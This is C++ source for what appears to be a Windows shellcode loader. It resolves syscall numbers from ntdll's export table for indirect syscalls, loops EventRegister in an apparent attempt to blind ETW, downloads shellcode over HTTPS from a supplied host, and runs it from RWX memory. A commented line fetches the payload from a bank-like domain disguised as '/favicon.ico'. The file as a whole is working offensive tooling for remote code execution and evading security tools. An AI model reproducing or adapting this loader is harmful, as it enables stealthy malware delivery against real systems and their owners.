#include <stdio.h>
#include "Typedefs.h"
#include "AxiomLoader.h"
#include "Syscall.h"
#include "AxiomSSN.h"

LPWSTR CstrToLpwstr(char* str)
{
	wchar_t* tmp = new wchar_t[4096];

	MultiByteToWideChar(CP_ACP, 0, str, -1, tmp, 4096);
	return (tmp);
}

void SelfInject(char* domain, char* filepath)
{
	std::vector<BYTE> shellcode;

	printf("[SYSTEM] Retrieving shellcode...\n");
	shellcode = DoHttpsDownload(CstrToLpwstr(domain), CstrToLpwstr(filepath));
	printf("[SYSTEM] Done ! Retrieved %d bytes\n", shellcode.size());

	NTSTATUS status = -1;
	LPVOID regionStart = NULL;
	SIZE_T regionSize = shellcode.size() + 1000;
	IndirectSyscall(
		status,
		AXIOM_SSN_NtAllocateVirtualMemory,
		GetCurrentProcess(),
		&regionStart,
		0,
		(PULONG64)&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (NT_SUCCESS(status)) {
		printf("[MEM_ALLOCATE] Indirect syscall success, allocated %ld bytes, starting at 0x%p\n", regionSize, regionStart);
	}
	else {
		printf("[NtAllocateVirtualMemory FAILURE] NTSTATUS Code: %ld\n", status);
		return;
	}

	printf("[SHENANIGANS] Copying bytes to memory region\n");
	drunk_memcpy((unsigned char*)regionStart, &shellcode[0], shellcode.size());
	printf("[SHENANIGANS] Done ! Jumping to executable region...\n");
	(*(void(*)()) regionStart)();
}

int main(int argc, char ** argv)
{
	bool res;
	size_t i;
	PTEB current_teb;
	PPEB current_peb;
	PLDR_DATA_TABLE_ENTRY ldr_data_table_entry;
	PIMAGE_EXPORT_DIRECTORY image_export_directory;
	PCHAR pczFunctionName;
	PVOID pFunctionAddress;
	PDWORD pdwAddressOfFunctions;
	PDWORD pdwAddressOfNames;
	PWORD pwAddressOfNameOrdinales;

	// Get TEB address of main thread
	current_teb = RtlGetThreadEnvironmentBlock();
	// Offset some bytes to get PEB address
	current_peb = current_teb->ProcessEnvironmentBlock;

	// Retrieve LDR_DATA_TABLE_ENTRY from PEB
	// In NTDLL, this has a record of every loaded module, whoch is quite interesting to us :p
	// Credit to : https://stackoverflow.com/questions/65717594/unable-to-read-memory-on-kernel32-dll-base-address
	// Answer is wrong tho, real address is at -0x10 bytes offset, I just bruteforced it until it worked lol
	ldr_data_table_entry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)current_peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
	res = GetImageExportDirectory(ldr_data_table_entry->DllBase, &image_export_directory);

	// Check that all addresses loaded well
	if (res == false || image_export_directory == NULL) {
		printf("GetImageExportDirectory init failure");
		return (1);
	}

	// From the EAT, parse all functions and load syscalls metadata
	// into our internal structs
	i = 0;
	pdwAddressOfFunctions = (PDWORD)((PBYTE)ldr_data_table_entry->DllBase + image_export_directory->AddressOfFunctions);
	pdwAddressOfNames = (PDWORD)((PBYTE)ldr_data_table_entry->DllBase + image_export_directory->AddressOfNames);
	pwAddressOfNameOrdinales = (PWORD)((PBYTE)ldr_data_table_entry->DllBase + image_export_directory->AddressOfNameOrdinals);
	for (WORD cx = 0; cx < image_export_directory->NumberOfNames; cx++)
	{
		pczFunctionName = (PCHAR)((PBYTE)ldr_data_table_entry->DllBase + pdwAddressOfNames[cx]);
		pFunctionAddress = (PBYTE)ldr_data_table_entry->DllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		int SSN;
		void* syscallAddr;
		ExtractFunctionSNN(pFunctionAddress, &SSN, &syscallAddr);
		if (SSN == 0 || syscallAddr == NULL)
			continue;

		i++;
		PAXIOM_TABLE_ENTRY newEntry = (PAXIOM_TABLE_ENTRY)malloc(sizeof(AXIOM_TABLE_ENTRY));
		if (newEntry == NULL) {
			printf("Malloc failure on new table entry\n");
			return (false);
		}

		newEntry->pAddress = pFunctionAddress;
		newEntry->humanFriendlyName = drunk_strdup(pczFunctionName);
		newEntry->dwHash = drunk_md5(pczFunctionName);
		newEntry->wSystemCall = SSN;
		newEntry->wSystemCallAddress = syscallAddr;
		//printf("Function name at addr %p: (hash: %s) %s with SSN: %d and syscall address: 0x%p\n", pFunctionAddress, newEntry->dwHash, pczFunctionName, newEntry->wSystemCall, newEntry->wSystemCallAddress);
		AddToAxiomTable(newEntry);
	}
	printf("Loaded %d table entries\n", i);

	DWORD status = ERROR_SUCCESS;
	REGHANDLE RegistrationHandle = NULL;
	const GUID ProviderGuid = { 0x230d3ce1, 0xbccc, 0x124e, {0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4} };
	int count = 0;
	while (status = EventRegister(&ProviderGuid, NULL, NULL, &RegistrationHandle) == ERROR_SUCCESS) {
		count++;
	}

	// From this point on, we have the ability to perform indirect syscalls with in-ntdll return
	// Like this:
	/*
	NTSTATUS status;
	IndirectSycall(
		status,
		AXIOM_SSN_*,
		syscall_arg1,
		syscall_arg2,
		syscall_arg3,
		...
	);
	*/

	SelfInject(argv[1], argv[2]);
	//SelfInject((char *)"infinity-bank.com", (char *)"/favicon.ico");
	return (0);
}